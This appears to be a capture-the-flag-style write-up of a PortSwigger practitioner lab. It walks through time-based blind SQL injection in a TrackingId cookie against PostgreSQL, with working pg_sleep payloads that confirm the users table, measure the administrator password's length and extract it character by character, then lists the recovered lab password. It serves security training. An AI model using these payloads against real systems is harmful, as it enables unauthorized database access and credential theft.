
### Blind SQL injection with time delays and information retrieval : PRACTITIONER

---

We will be injecting in the `TrackingId` cookie, testing the time delay blind injection.

Test the injection point assuming PostgreSQL.
```
' || pg_sleep(10) --
```
- The response completes after 10 seconds, therefore, it is vulnerable to time delay injection.

Check for the presence of the `users` table using a time delay.
```
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users --
```
- See that the response comes after 10 seconds, implying that the users table exists.

Now checking for the administrator username.
```
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator') -- 
```
- Response comes after 10 seconds, hence, the administrator username exists.

>Using BURPSUITE INTRUDER spider attack with the placeholder at the length, we can enumerate the length of the password.

```
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND LENGTH(password)>20 ) -- 
```
- See that at 20, it sends the response immediately, meaning that it is 20 characters long.

> Now, using the BURPSUITE INTRUDER cluster bomb attack, we can obtain the characters of each index in the password.

```
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users WHERE username='administrator' AND  SUBSTRING(password,1,1) ='a') -- 
```

Similar to [[Portswigger/SQL Injection/Lab 7]], brute force the password with the indices from 1-20 and the characters from a-z and 0-9.
- Check the response received column, those with the delay have the correct values.

1 - y
2 - v
3 - l
4 - r
5 - z
6 - p
7 - w
8 - k
9 - 9
10 - v
11 - j
12 - 4
13 - a
14 - 6
15 - g
16 - n
17 - 1
18 - j
19 - d
20 - k

Submit the password and login as admin to complete lab.

---
